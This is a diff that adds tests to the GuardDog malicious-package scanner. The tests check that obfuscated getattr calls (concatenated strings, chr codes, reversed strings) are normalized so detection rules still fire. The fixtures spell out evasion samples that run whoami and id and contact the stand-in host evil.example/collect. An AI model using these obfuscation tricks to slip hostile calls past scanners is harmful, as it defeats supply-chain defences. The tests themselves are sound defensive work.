@@ -6,6 +6,7 @@ import pytest
 
 from guarddog import ecosystems
 from guarddog.analyzer.analyzer import Analyzer
+from guarddog.analyzer.python_normalizer import normalize_python_source
 from guarddog.ecosystems import LANGUAGE
 
 pypi_analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
@@ -414,3 +415,174 @@ def test_is_match_in_comment_with_byte_offset():
             assert Analyzer.is_match_in_comment(f.name, line_number=3, byte_offset=byte_offset) is True
         finally:
             os.unlink(f.name)
+
+
+# Python getattr normalization tests (regression for #914)
+
+
+@pytest.mark.parametrize(
+    "source,expected",
+    [
+        (
+            b'getattr(requests, "get")("https://evil.example")\n',
+            b'requests.get("https://evil.example")\n',
+        ),
+        (
+            b'getattr(requests, "ge" + "t")("https://evil.example")\n',
+            b'requests.get("https://evil.example")\n',
+        ),
+        (
+            b'getattr(requests, chr(103) + chr(101) + chr(116))("https://evil.example")\n',
+            b'requests.get("https://evil.example")\n',
+        ),
+        (
+            b'getattr(os, "".join(["sys", "tem"]))("whoami")\n',
+            b'os.system("whoami")\n',
+        ),
+        (
+            b'getattr(os, "".join(map(chr, [115, 121, 115, 116, 101, 109])))("whoami")\n',
+            b'os.system("whoami")\n',
+        ),
+        (
+            b'getattr(os, "".join(chr(c) for c in [115, 121, 115, 116, 101, 109]))("whoami")\n',
+            b'os.system("whoami")\n',
+        ),
+        (
+            b'getattr(os, "metsys"[::-1])("whoami")\n',
+            b'os.system("whoami")\n',
+        ),
+        (
+            b'getattr(os, "".join(reversed("metsys")))("whoami")\n',
+            b'os.system("whoami")\n',
+        ),
+        (
+            b"getattr(os, f\"{'sys'}{'tem'}\")(\"whoami\")\n",
+            b'os.system("whoami")\n',
+        ),
+        (
+            b'getattr(getattr(urllib, "req" + "uest"), "url" + "open")("https://evil.example")\n',
+            b'urllib.request.urlopen("https://evil.example")\n',
+        ),
+        (
+            b'builtins.getattr(subprocess, "ru" + "n")(["id"])\n',
+            b'subprocess.run(["id"])\n',
+        ),
+        (
+            b'getattr(os, "system", None)("whoami")\n',
+            b'os.system("whoami")\n',
+        ),
+        (
+            b'a = 1\ngetattr(\n    os,\n    "sys" + "tem",\n)("whoami")\nb = 2\n',
+            b'a = 1\n\n\n\nos.system("whoami")\nb = 2\n',
+        ),
+        (
+            '# caf\xc3\xa9\nx = "\xc3\xa9"; getattr(os, "sys" + "tem")("whoami")\n'.encode(
+                "utf-8"
+            ),
+            '# caf\xc3\xa9\nx = "\xc3\xa9"; os.system("whoami")\n'.encode("utf-8"),
+        ),
+    ],
+)
+def test_normalize_python_source_rewrites_constant_getattr(source, expected):
+    normalized = normalize_python_source(source)
+    assert normalized == expected
+    assert normalized.count(b"\n") == source.count(b"\n")
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        b'import os\nos.system("whoami")\n',
+        b'# getattr(os, "system")("whoami")\n',
+        b'host = getattr(settings, "STATSD_HOST", "localhost")\n',
+        b'fn = getattr(requests, "get", None)\n',
+        b"getattr(obj, attr_name)()\n",
+        b'getattr(obj, "not-an-identifier")()\n',
+        b'getattr(obj, "class")()\n',
+        b'def broken(:\n    getattr(os, "system")\n',
+    ],
+)
+def test_normalize_python_source_skips_unrewritable_cases(source):
+    assert normalize_python_source(source) is None
+
+
+def test_getattr_dynamic_calls_detected_by_capability_and_threat_rules():
+    """Regression test for #914: constant getattr calls must not evade YARA rules."""
+    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
+    rules = {
+        "capability-network-outbound",
+        "capability-network-download",
+        "capability-process-spawn",
+        "capability-filesystem-read",
+        "threat-network-exfil-sysinfo",
+        "threat-process-sysinfo",
+        "threat-runtime-obfuscation-api",
+    }
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        _write(
+            tmpdir,
+            "adv.py",
+            (
+                "import os\n"
+                "import requests\n"
+                "import subprocess\n"
+                "\n"
+                'getattr(requests, "ge" + "t")("https://evil.example/collect")\n'
+                'getattr(subprocess, "ru" + "n")(["id"], shell=False)\n'
+                'getattr(os, "sys" + "tem")("whoami")\n'
+                'getattr(handle, "re" + "ad")()\n'
+            ),
+        )
+        res = analyzer.analyze_sourcecode(tmpdir, rules)
+        assert not res["errors"]
+        results = res["results"]
+
+        assert results["capability-network-outbound"]
+        assert results["capability-network-outbound"][0]["location"] == "adv.py:5"
+        assert results["capability-network-download"]
+        assert results["capability-network-download"][0]["location"] == "adv.py:5"
+        assert results["capability-process-spawn"]
+        assert results["capability-process-spawn"][0]["location"] == "adv.py:6"
+        assert results["capability-filesystem-read"]
+        assert results["capability-filesystem-read"][0]["location"] == "adv.py:8"
+        assert results["threat-network-exfil-sysinfo"]
+        assert results["threat-process-sysinfo"]
+        assert results["threat-process-sysinfo"][0]["location"] == "adv.py:7"
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        _write(
+            tmpdir,
+            "chr_evasion.py",
+            (
+                "import requests\n"
+                'getattr(requests, chr(103) + chr(101) + chr(116))("https://evil.example")\n'
+            ),
+        )
+        res = analyzer.analyze_sourcecode(tmpdir, {"capability-network-outbound"})
+        assert res["results"]["capability-network-outbound"]
+        assert (
+            res["results"]["capability-network-outbound"][0]["location"]
+            == "chr_evasion.py:2"
+        )
+
+    # Passive 3-arg getattr feature checks must not trigger false positives.
+    with tempfile.TemporaryDirectory() as tmpdir:
+        _write(
+            tmpdir,
+            "benign.py",
+            'import requests\nget_fn = getattr(requests, "get", None)\n',
+        )
+        res = analyzer.analyze_sourcecode(tmpdir, {"capability-network-outbound"})
+        assert not res["results"]["capability-network-outbound"]
+
+    # Raw-source rules matching literal getattr must continue to fire.
+    with tempfile.TemporaryDirectory() as tmpdir:
+        _write(
+            tmpdir,
+            "raw_getattr.py",
+            'getattr(__builtins__, "exec")("print(1)")\n',
+        )
+        res = analyzer.analyze_sourcecode(tmpdir, {"threat-runtime-obfuscation-api"})
+        assert res["results"]["threat-runtime-obfuscation-api"]
+
